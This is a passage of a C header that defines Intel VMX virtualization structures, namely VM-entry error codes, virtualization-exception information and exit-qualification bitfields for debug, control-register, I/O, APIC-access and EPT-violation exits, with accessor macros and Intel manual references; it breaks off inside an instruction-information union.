#define VMX_ERROR_VMENTRY_INVALID_VM_EXECUTION_CONTROL               0x00000019

                                                                                           /**
                                                                                            * VM entry with events blocked by MOV SS.
                                                                                            */
#define VMX_ERROR_VMENTRY_MOV_SS                                     0x0000001A

                                                                                            /**
                                                                                             * Invalid operand to INVEPT/INVVPID.
                                                                                             */
#define VMX_ERROR_INVEPT_INVVPID_INVALID_OPERAND                     0x0000001C
                                                                                             /**
                                                                                              * @}
                                                                                              */

                                                                                              /**
                                                                                               * @defgroup VMX_EXCEPTIONS \
                                                                                               *           Virtualization Exceptions
                                                                                               *
                                                                                               * Virtualization Exceptions.
                                                                                               *
                                                                                               * @see Vol3C[25.5.6(Virtualization Exceptions)] (reference)
                                                                                               * @{
                                                                                               */
typedef struct
{
    /**
     * The 32-bit value that would have been saved into the VMCS as an exit reason had a VM exit occurred instead of the
     * virtualization exception. For EPT violations, this value is 48 (00000030H).
     */
    UINT32 Reason;

    /**
     * FFFFFFFFH
     */
    UINT32 ExceptionMask;

    /**
     * The 64-bit value that would have been saved into the VMCS as an exit qualification had a VM exit occurred instead of the
     * virtualization exception.
     */
    UINT64 Exit;

    /**
     * The 64-bit value that would have been saved into the VMCS as a guest-linear address had a VM exit occurred instead of
     * the virtualization exception.
     */
    UINT64 GuestLinearAddress;

    /**
     * The 64-bit value that would have been saved into the VMCS as a guest-physical address had a VM exit occurred instead of
     * the virtualization exception.
     */
    UINT64 GuestPhysicalAddress;

    /**
     * The current 16-bit value of the EPTP index VM-execution control.
     *
     * @see Vol3C[24.6.18(Controls for Virtualization Exceptions)]
     * @see Vol3C[25.5.5.3(EPTP Switching)]
     */
    UINT16 CurrentEptpIndex;
} VMX_VIRTUALIZATION_EXCEPTION_INFORMATION;

/**
 * @}
 */

 /**
  * @defgroup VMX_BASIC_EXIT_INFORMATION \
  *           Basic VM-Exit Information
  *
  * Basic VM-Exit Information.
  *
  * @see Vol3C[27.2.1(Basic VM-Exit Information)] (reference)
  * @{
  */
  /**
   * @brief Exit Qualification for Debug Exceptions
   */
typedef union
{
    struct
    {
        /**
         * @brief B0 - B3
         *
         * [Bits 3:0] When set, each of these bits indicates that the corresponding breakpoint condition was met. Any of these bits
         * may be set even if its corresponding enabling bit in DR7 is not set.
         */
        UINT64 BreakpointCondition : 4;
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_BREAKPOINT_CONDITION_BIT 0
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_BREAKPOINT_CONDITION_FLAG 0x0F
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_BREAKPOINT_CONDITION_MASK 0x0F
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_BREAKPOINT_CONDITION(_) (((_) >> 0) & 0x0F)
        UINT64 Reserved1 : 9;

        /**
         * @brief BD
         *
         * [Bit 13] When set, this bit indicates that the cause of the debug exception is "debug register access detected."
         */
        UINT64 DebugRegisterAccessDetected : 1;
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_DEBUG_REGISTER_ACCESS_DETECTED_BIT 13
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_DEBUG_REGISTER_ACCESS_DETECTED_FLAG 0x2000
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_DEBUG_REGISTER_ACCESS_DETECTED_MASK 0x01
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_DEBUG_REGISTER_ACCESS_DETECTED(_) (((_) >> 13) & 0x01)

        /**
         * @brief BS
         *
         * [Bit 14] When set, this bit indicates that the cause of the debug exception is either the execution of a single
         * instruction (if RFLAGS.TF = 1 and IA32_DEBUGCTL.BTF = 0) or a taken branch (if RFLAGS.TF = DEBUGCTL.BTF = 1).
         */
        UINT64 SingleInstruction : 1;
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_SINGLE_INSTRUCTION_BIT 14
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_SINGLE_INSTRUCTION_FLAG 0x4000
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_SINGLE_INSTRUCTION_MASK 0x01
#define VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION_SINGLE_INSTRUCTION(_) (((_) >> 14) & 0x01)
        UINT64 Reserved2 : 49;
    };

    UINT64 Flags;
} VMX_EXIT_QUALIFICATION_DEBUG_EXCEPTION;

/**
 * @brief Exit Qualification for Task Switch
 */
typedef union
{
    struct
    {
        /**
         * [Bits 15:0] Selector of task-state segment (TSS) to which the guest attempted to switch.
         */
        UINT64 Selector : 16;
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SELECTOR_BIT              0
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SELECTOR_FLAG             0xFFFF
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SELECTOR_MASK             0xFFFF
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SELECTOR(_)               (((_) >> 0) & 0xFFFF)
        UINT64 Reserved1 : 14;

        /**
         * [Bits 31:30] Source of task switch initiation.
         */
        UINT64 Source : 2;
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SOURCE_BIT                30
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SOURCE_FLAG               0xC0000000
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SOURCE_MASK               0x03
#define VMX_EXIT_QUALIFICATION_TASK_SWITCH_SOURCE(_)                 (((_) >> 30) & 0x03)
#define VMX_EXIT_QUALIFICATION_TYPE_CALL_INSTRUCTION                 0x00000000
#define VMX_EXIT_QUALIFICATION_TYPE_IRET_INSTRUCTION                 0x00000001
#define VMX_EXIT_QUALIFICATION_TYPE_JMP_INSTRUCTION                  0x00000002
#define VMX_EXIT_QUALIFICATION_TYPE_TASK_GATE_IN_IDT                 0x00000003
        UINT64 Reserved2 : 32;
    };

    UINT64 Flags;
} VMX_EXIT_QUALIFICATION_TASK_SWITCH;

/**
 * @brief Exit Qualification for Control-Register Accesses
 */
typedef union
{
    struct
    {
        /**
         * [Bits 3:0] Number of control register (0 for CLTS and LMSW). Bit 3 is always 0 on processors that do not support Intel
         * 64 architecture as they do not support CR8.
         */
        UINT64 ControlRegister : 4;
#define VMX_EXIT_QUALIFICATION_MOV_CR_CONTROL_REGISTER_BIT           0
#define VMX_EXIT_QUALIFICATION_MOV_CR_CONTROL_REGISTER_FLAG          0x0F
#define VMX_EXIT_QUALIFICATION_MOV_CR_CONTROL_REGISTER_MASK          0x0F
#define VMX_EXIT_QUALIFICATION_MOV_CR_CONTROL_REGISTER(_)            (((_) >> 0) & 0x0F)
#define VMX_EXIT_QUALIFICATION_REGISTER_CR0                          0x00000000
#define VMX_EXIT_QUALIFICATION_REGISTER_CR2                          0x00000002
#define VMX_EXIT_QUALIFICATION_REGISTER_CR3                          0x00000003
#define VMX_EXIT_QUALIFICATION_REGISTER_CR4                          0x00000004
#define VMX_EXIT_QUALIFICATION_REGISTER_CR8                          0x00000008

        /**
         * [Bits 5:4] Access type.
         */
        UINT64 AccessType : 2;
#define VMX_EXIT_QUALIFICATION_MOV_CR_ACCESS_TYPE_BIT                4
#define VMX_EXIT_QUALIFICATION_MOV_CR_ACCESS_TYPE_FLAG               0x30
#define VMX_EXIT_QUALIFICATION_MOV_CR_ACCESS_TYPE_MASK               0x03
#define VMX_EXIT_QUALIFICATION_MOV_CR_ACCESS_TYPE(_)                 (((_) >> 4) & 0x03)
#define VMX_EXIT_QUALIFICATION_ACCESS_MOV_TO_CR                      0x00000000
#define VMX_EXIT_QUALIFICATION_ACCESS_MOV_FROM_CR                    0x00000001
#define VMX_EXIT_QUALIFICATION_ACCESS_CLTS                           0x00000002
#define VMX_EXIT_QUALIFICATION_ACCESS_LMSW                           0x00000003

        /**
         * [Bit 6] LMSW operand type. For CLTS and MOV CR, cleared to 0.
         */
        UINT64 LmswOperandType : 1;
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_OPERAND_TYPE_BIT          6
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_OPERAND_TYPE_FLAG         0x40
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_OPERAND_TYPE_MASK         0x01
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_OPERAND_TYPE(_)           (((_) >> 6) & 0x01)
#define VMX_EXIT_QUALIFICATION_LMSW_OP_REGISTER                      0x00000000
#define VMX_EXIT_QUALIFICATION_LMSW_OP_MEMORY                        0x00000001
        UINT64 Reserved1 : 1;

        /**
         * [Bits 11:8] For MOV CR, the general-purpose register.
         */
        UINT64 GeneralPurposeRegister : 4;
#define VMX_EXIT_QUALIFICATION_MOV_CR_GENERAL_PURPOSE_REGISTER_BIT   8
#define VMX_EXIT_QUALIFICATION_MOV_CR_GENERAL_PURPOSE_REGISTER_FLAG  0xF00
#define VMX_EXIT_QUALIFICATION_MOV_CR_GENERAL_PURPOSE_REGISTER_MASK  0x0F
#define VMX_EXIT_QUALIFICATION_MOV_CR_GENERAL_PURPOSE_REGISTER(_)    (((_) >> 8) & 0x0F)
#define VMX_EXIT_QUALIFICATION_GENREG_RAX                            0x00000000
#define VMX_EXIT_QUALIFICATION_GENREG_RCX                            0x00000001
#define VMX_EXIT_QUALIFICATION_GENREG_RDX                            0x00000002
#define VMX_EXIT_QUALIFICATION_GENREG_RBX                            0x00000003
#define VMX_EXIT_QUALIFICATION_GENREG_RSP                            0x00000004
#define VMX_EXIT_QUALIFICATION_GENREG_RBP                            0x00000005
#define VMX_EXIT_QUALIFICATION_GENREG_RSI                            0x00000006
#define VMX_EXIT_QUALIFICATION_GENREG_RDI                            0x00000007
#define VMX_EXIT_QUALIFICATION_GENREG_R8                             0x00000008
#define VMX_EXIT_QUALIFICATION_GENREG_R9                             0x00000009
#define VMX_EXIT_QUALIFICATION_GENREG_R10                            0x0000000A
#define VMX_EXIT_QUALIFICATION_GENREG_R11                            0x0000000B
#define VMX_EXIT_QUALIFICATION_GENREG_R12                            0x0000000C
#define VMX_EXIT_QUALIFICATION_GENREG_R13                            0x0000000D
#define VMX_EXIT_QUALIFICATION_GENREG_R14                            0x0000000E
#define VMX_EXIT_QUALIFICATION_GENREG_R15                            0x0000000F
        UINT64 Reserved2 : 4;

        /**
         * [Bits 31:16] For LMSW, the LMSW source data. For CLTS and MOV CR, cleared to 0.
         */
        UINT64 LmswSourceData : 16;
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_SOURCE_DATA_BIT           16
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_SOURCE_DATA_FLAG          0xFFFF0000
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_SOURCE_DATA_MASK          0xFFFF
#define VMX_EXIT_QUALIFICATION_MOV_CR_LMSW_SOURCE_DATA(_)            (((_) >> 16) & 0xFFFF)
        UINT64 Reserved3 : 32;
    };

    UINT64 Flags;
} VMX_EXIT_QUALIFICATION_MOV_CR;

/**
 * @brief Exit Qualification for MOV DR
 */
typedef union
{
    struct
    {
        /**
         * [Bits 2:0] Number of debug register.
         */
        UINT64 DebugRegister : 3;
#define VMX_EXIT_QUALIFICATION_MOV_DR_DEBUG_REGISTER_BIT             0
#define VMX_EXIT_QUALIFICATION_MOV_DR_DEBUG_REGISTER_FLAG            0x07
#define VMX_EXIT_QUALIFICATION_MOV_DR_DEBUG_REGISTER_MASK            0x07
#define VMX_EXIT_QUALIFICATION_MOV_DR_DEBUG_REGISTER(_)              (((_) >> 0) & 0x07)
#define VMX_EXIT_QUALIFICATION_REGISTER_DR0                          0x00000000
#define VMX_EXIT_QUALIFICATION_REGISTER_DR1                          0x00000001
#define VMX_EXIT_QUALIFICATION_REGISTER_DR2                          0x00000002
#define VMX_EXIT_QUALIFICATION_REGISTER_DR3                          0x00000003
#define VMX_EXIT_QUALIFICATION_REGISTER_DR6                          0x00000006
#define VMX_EXIT_QUALIFICATION_REGISTER_DR7                          0x00000007
        UINT64 Reserved1 : 1;

        /**
         * [Bit 4] Direction of access (0 = MOV to DR; 1 = MOV from DR).
         */
        UINT64 DirectionOfAccess : 1;
#define VMX_EXIT_QUALIFICATION_MOV_DR_DIRECTION_OF_ACCESS_BIT        4
#define VMX_EXIT_QUALIFICATION_MOV_DR_DIRECTION_OF_ACCESS_FLAG       0x10
#define VMX_EXIT_QUALIFICATION_MOV_DR_DIRECTION_OF_ACCESS_MASK       0x01
#define VMX_EXIT_QUALIFICATION_MOV_DR_DIRECTION_OF_ACCESS(_)         (((_) >> 4) & 0x01)
#define VMX_EXIT_QUALIFICATION_DIRECTION_MOV_TO_DR                   0x00000000
#define VMX_EXIT_QUALIFICATION_DIRECTION_MOV_FROM_DR                 0x00000001
        UINT64 Reserved2 : 3;

        /**
         * [Bits 11:8] General-purpose register.
         */
        UINT64 GeneralPurposeRegister : 4;
#define VMX_EXIT_QUALIFICATION_MOV_DR_GENERAL_PURPOSE_REGISTER_BIT   8
#define VMX_EXIT_QUALIFICATION_MOV_DR_GENERAL_PURPOSE_REGISTER_FLAG  0xF00
#define VMX_EXIT_QUALIFICATION_MOV_DR_GENERAL_PURPOSE_REGISTER_MASK  0x0F
#define VMX_EXIT_QUALIFICATION_MOV_DR_GENERAL_PURPOSE_REGISTER(_)    (((_) >> 8) & 0x0F)
        UINT64 Reserved3 : 52;
    };

    UINT64 Flags;
} VMX_EXIT_QUALIFICATION_MOV_DR;

/**
 * @brief Exit Qualification for I/O Instructions
 */
typedef union
{
    struct
    {
        /**
         * [Bits 2:0] Size of access.
         */
        UINT64 SizeOfAccess : 3;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_SIZE_OF_ACCESS_BIT     0
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_SIZE_OF_ACCESS_FLAG    0x07
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_SIZE_OF_ACCESS_MASK    0x07
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_SIZE_OF_ACCESS(_)      (((_) >> 0) & 0x07)
#define VMX_EXIT_QUALIFICATION_WIDTH_1_BYTE                          0x00000000
#define VMX_EXIT_QUALIFICATION_WIDTH_2_BYTE                          0x00000001
#define VMX_EXIT_QUALIFICATION_WIDTH_4_BYTE                          0x00000003

        /**
         * [Bit 3] Direction of the attempted access (0 = OUT, 1 = IN).
         */
        UINT64 DirectionOfAccess : 1;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_DIRECTION_OF_ACCESS_BIT 3
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_DIRECTION_OF_ACCESS_FLAG 0x08
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_DIRECTION_OF_ACCESS_MASK 0x01
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_DIRECTION_OF_ACCESS(_) (((_) >> 3) & 0x01)
#define VMX_EXIT_QUALIFICATION_DIRECTION_OUT                         0x00000000
#define VMX_EXIT_QUALIFICATION_DIRECTION_IN                          0x00000001

        /**
         * [Bit 4] String instruction (0 = not string; 1 = string).
         */
        UINT64 StringInstruction : 1;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_STRING_INSTRUCTION_BIT 4
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_STRING_INSTRUCTION_FLAG 0x10
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_STRING_INSTRUCTION_MASK 0x01
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_STRING_INSTRUCTION(_)  (((_) >> 4) & 0x01)
#define VMX_EXIT_QUALIFICATION_IS_STRING_NOT_STRING                  0x00000000
#define VMX_EXIT_QUALIFICATION_IS_STRING_STRING                      0x00000001

        /**
         * [Bit 5] REP prefixed (0 = not REP; 1 = REP).
         */
        UINT64 RepPrefixed : 1;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_REP_PREFIXED_BIT       5
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_REP_PREFIXED_FLAG      0x20
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_REP_PREFIXED_MASK      0x01
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_REP_PREFIXED(_)        (((_) >> 5) & 0x01)
#define VMX_EXIT_QUALIFICATION_IS_REP_NOT_REP                        0x00000000
#define VMX_EXIT_QUALIFICATION_IS_REP_REP                            0x00000001

        /**
         * [Bit 6] Operand encoding (0 = DX, 1 = immediate).
         */
        UINT64 OperandEncoding : 1;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_OPERAND_ENCODING_BIT   6
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_OPERAND_ENCODING_FLAG  0x40
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_OPERAND_ENCODING_MASK  0x01
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_OPERAND_ENCODING(_)    (((_) >> 6) & 0x01)
#define VMX_EXIT_QUALIFICATION_ENCODING_DX                           0x00000000
#define VMX_EXIT_QUALIFICATION_ENCODING_IMMEDIATE                    0x00000001
        UINT64 Reserved1 : 9;

        /**
         * [Bits 31:16] Port number (as specified in DX or in an immediate operand).
         */
        UINT64 PortNumber : 16;
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_PORT_NUMBER_BIT        16
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_PORT_NUMBER_FLAG       0xFFFF0000
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_PORT_NUMBER_MASK       0xFFFF
#define VMX_EXIT_QUALIFICATION_IO_INSTRUCTION_PORT_NUMBER(_)         (((_) >> 16) & 0xFFFF)
        UINT64 Reserved2 : 32;
    };

    UINT64 Flags;
} VMX_EXIT_QUALIFICATION_IO_INSTRUCTION;

/**
 * @brief Exit Qualification for APIC-Access VM Exits from Linear Accesses and Guest-Physical Accesses
 */
typedef union
{
    struct
    {
        /**
         * [Bits 11:0] - If the APIC-access VM exit is due to a linear access, the offset of access within the APIC page.
         * - Undefined if the APIC-access VM exit is due a guest-physical access.
         */
        UINT64 PageOffset : 12;
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_PAGE_OFFSET_BIT           0
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_PAGE_OFFSET_FLAG          0xFFF
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_PAGE_OFFSET_MASK          0xFFF
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_PAGE_OFFSET(_)            (((_) >> 0) & 0xFFF)

        /**
         * [Bits 15:12] Access type.
         */
        UINT64 AccessType : 4;
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_ACCESS_TYPE_BIT           12
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_ACCESS_TYPE_FLAG          0xF000
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_ACCESS_TYPE_MASK          0x0F
#define VMX_EXIT_QUALIFICATION_APIC_ACCESS_ACCESS_TYPE(_)            (((_) >> 12) & 0x0F)
        /**
         * Linear access for a data read during instruction execution.
         */
#define VMX_EXIT_QUALIFICATION_TYPE_LINEAR_READ                      0x00000000

         /**
          * Linear access for a data write during instruction execution.
          */
#define VMX_EXIT_QUALIFICATION_TYPE_LINEAR_WRITE                     0x00000001

          /**
           * Linear access for an instruction fetch.
           */
#define VMX_EXIT_QUALIFICATION_TYPE_LINEAR_INSTRUCTION_FETCH         0x00000002

           /**
            * Linear access (read or write) during event delivery.
            */
#define VMX_EXIT_QUALIFICATION_TYPE_LINEAR_EVENT_DELIVERY            0x00000003

            /**
             * Guest-physical access during event delivery.
             */
#define VMX_EXIT_QUALIFICATION_TYPE_PHYSICAL_EVENT_DELIVERY          0x0000000A

             /**
              * Guest-physical access for an instruction fetch or during instruction execution.
              */
#define VMX_EXIT_QUALIFICATION_TYPE_PHYSICAL_INSTRUCTION_FETCH       0x0000000F
        UINT64 Reserved1 : 48;
    };

    UINT64 Flags;
} VMX_EXIT_QUALIFICATION_APIC_ACCESS;

/**
 * @brief Exit Qualification for EPT Violations
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Set if the access causing the EPT violation was a data read.
         */
        UINT64 ReadAccess : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READ_ACCESS_BIT         0
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READ_ACCESS_FLAG        0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READ_ACCESS_MASK        0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READ_ACCESS(_)          (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Set if the access causing the EPT violation was a data write.
         */
        UINT64 WriteAccess : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_WRITE_ACCESS_BIT        1
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_WRITE_ACCESS_FLAG       0x02
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_WRITE_ACCESS_MASK       0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_WRITE_ACCESS(_)         (((_) >> 1) & 0x01)

        /**
         * [Bit 2] Set if the access causing the EPT violation was an instruction fetch.
         */
        UINT64 ExecuteAccess : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_ACCESS_BIT      2
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_ACCESS_FLAG     0x04
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_ACCESS_MASK     0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_ACCESS(_)       (((_) >> 2) & 0x01)

        /**
         * [Bit 3] The logical-AND of bit 0 in the EPT paging-structure entries used to translate the guest-physical address of the
         * access causing the EPT violation (indicates whether the guest-physical address was readable).
         */
        UINT64 EptReadable : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_READABLE_BIT        3
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_READABLE_FLAG       0x08
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_READABLE_MASK       0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_READABLE(_)         (((_) >> 3) & 0x01)

        /**
         * [Bit 4] The logical-AND of bit 1 in the EPT paging-structure entries used to translate the guest-physical address of the
         * access causing the EPT violation (indicates whether the guest-physical address was writeable).
         */
        UINT64 EptWriteable : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_WRITEABLE_BIT       4
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_WRITEABLE_FLAG      0x10
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_WRITEABLE_MASK      0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_WRITEABLE(_)        (((_) >> 4) & 0x01)

        /**
         * [Bit 5] The logical-AND of bit 2 in the EPT paging-structure entries used to translate the guest-physical address of the
         * access causing the EPT violation.
         * If the "mode-based execute control for EPT" VM-execution control is 0, this indicates whether the guest-physical address
         * was executable. If that control is 1, this indicates whether the guest-physical address was executable for
         * supervisor-mode linear addresses.
         */
        UINT64 EptExecutable : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_BIT      5
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_FLAG     0x20
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_MASK     0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE(_)       (((_) >> 5) & 0x01)

        /**
         * [Bit 6] If the "mode-based execute control" VM-execution control is 0, the value of this bit is undefined. If that
         * control is 1, this bit is the logical-AND of bit 10 in the EPT paging-structures entries used to translate the
         * guest-physical address of the access causing the EPT violation. In this case, it indicates whether the guest-physical
         * address was executable for user-mode linear addresses.
         */
        UINT64 EptExecutableForUserMode : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_FOR_USER_MODE_BIT 6
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_FOR_USER_MODE_FLAG 0x40
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_FOR_USER_MODE_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_FOR_USER_MODE(_) (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Set if the guest linear-address field is valid. The guest linear-address field is valid for all EPT violations
         * except those resulting from an attempt to load the guest PDPTEs as part of the execution of the MOV CR instruction.
         */
        UINT64 ValidGuestLinearAddress : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_VALID_GUEST_LINEAR_ADDRESS_BIT 7
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_VALID_GUEST_LINEAR_ADDRESS_FLAG 0x80
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_VALID_GUEST_LINEAR_ADDRESS_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_VALID_GUEST_LINEAR_ADDRESS(_) (((_) >> 7) & 0x01)

        /**
         * [Bit 8] If bit 7 is 1:
         * - Set if the access causing the EPT violation is to a guest-physical address that is the translation of a linear
         * address.
         * - Clear if the access causing the EPT violation is to a paging-structure entry as part of a page walk or the update of
         * an accessed or dirty bit.
         * Reserved if bit 7 is 0 (cleared to 0).
         */
        UINT64 CausedByTranslation : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_CAUSED_BY_TRANSLATION_BIT 8
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_CAUSED_BY_TRANSLATION_FLAG 0x100
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_CAUSED_BY_TRANSLATION_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_CAUSED_BY_TRANSLATION(_) (((_) >> 8) & 0x01)

        /**
         * [Bit 9] This bit is 0 if the linear address is a supervisor-mode linear address and 1 if it is a user-mode linear
         * address. Otherwise, this bit is undefined.
         *
         * @remarks If bit 7 is 1, bit 8 is 1, and the processor supports advanced VM-exit information for EPT violations. (If
         *          CR0.PG = 0, the translation of every linear address is a user-mode linear address and thus this bit will be 1.)
         */
        UINT64 UserModeLinearAddress : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_USER_MODE_LINEAR_ADDRESS_BIT 9
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_USER_MODE_LINEAR_ADDRESS_FLAG 0x200
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_USER_MODE_LINEAR_ADDRESS_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_USER_MODE_LINEAR_ADDRESS(_) (((_) >> 9) & 0x01)

        /**
         * [Bit 10] This bit is 0 if paging translates the linear address to a read-only page and 1 if it translates to a
         * read/write page. Otherwise, this bit is undefined
         *
         * @remarks If bit 7 is 1, bit 8 is 1, and the processor supports advanced VM-exit information for EPT violations. (If
         *          CR0.PG = 0, every linear address is read/write and thus this bit will be 1.)
         */
        UINT64 ReadableWritablePage : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READABLE_WRITABLE_PAGE_BIT 10
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READABLE_WRITABLE_PAGE_FLAG 0x400
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READABLE_WRITABLE_PAGE_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READABLE_WRITABLE_PAGE(_) (((_) >> 10) & 0x01)

        /**
         * [Bit 11] This bit is 0 if paging translates the linear address to an executable page and 1 if it translates to an
         * execute-disable page. Otherwise, this bit is undefined.
         *
         * @remarks If bit 7 is 1, bit 8 is 1, and the processor supports advanced VM-exit information for EPT violations. (If
         *          CR0.PG = 0, CR4.PAE = 0, or IA32_EFER.NXE = 0, every linear address is executable and thus this bit will be 0.)
         */
        UINT64 ExecuteDisablePage : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_DISABLE_PAGE_BIT 11
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_DISABLE_PAGE_FLAG 0x800
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_DISABLE_PAGE_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_DISABLE_PAGE(_) (((_) >> 11) & 0x01)

        /**
         * [Bit 12] NMI unblocking due to IRET.
         */
        UINT64 NmiUnblocking : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_NMI_UNBLOCKING_BIT      12
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_NMI_UNBLOCKING_FLAG     0x1000
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_NMI_UNBLOCKING_MASK     0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_NMI_UNBLOCKING(_)       (((_) >> 12) & 0x01)
        UINT64 Reserved1 : 51;
    };

    UINT64 Flags;
} VMX_EXIT_QUALIFICATION_EPT_VIOLATION;

/**
 * @}
 */

 /**
  * @defgroup VMX_VMEXIT_INSTRUCTION_INFORMATION \
  *           Information for VM Exits Due to Instruction Execution
  *
  * Information for VM Exits Due to Instruction Execution.
  *
  * @see Vol3C[27.2.4(Information for VM Exits Due to Instruction Execution)] (reference)
  * @{
  */
  /**
   * @brief VM-Exit Instruction-Information Field as Used for INS and OUTS
   */
typedef union
{
    struct
    {
        UINT64 Reserved1 : 7;

        /**
         * @brief Address size
         *
         * [Bits 9:7] 0: 16-bit
